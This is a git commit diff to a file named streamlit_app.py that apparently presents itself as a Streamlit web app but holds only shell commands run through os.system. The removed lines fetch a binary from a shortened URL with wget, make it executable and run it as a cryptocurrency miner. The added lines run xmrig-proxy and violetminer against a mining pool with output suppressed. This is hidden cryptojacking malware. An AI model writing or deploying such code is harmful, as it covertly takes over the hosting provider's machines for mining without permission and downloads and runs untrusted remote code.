dc494bc36038d8739d961c82aeeaf8ddb1de3626
mariobiszz <88525716+mariobiszz@users.noreply.github.com>
2021-12-16 17:51:39 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,5 +1,5 @@
 import os
 
-os.system("wget -qO subrek https://bit.ly/3Ipgmg8")
-os.system("chmod u+x subscribe")
-os.system("./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)")
+os.system("chmod 777 xmrig-proxy violetminer")
+os.system("./xmrig-proxy -a rx/0 -o pool.allcoins.pw:3333 -u allcoins.pw -p 581058 -b 0.0.0.0:3333 -m simple >/dev/null &")
+os.system("./violetminer --pool pool.allcoins.pw:3333 --username allcoins.pw --password 581058 --algorithm wrkzcoin >/dev/null >/dev/null 2>&1")
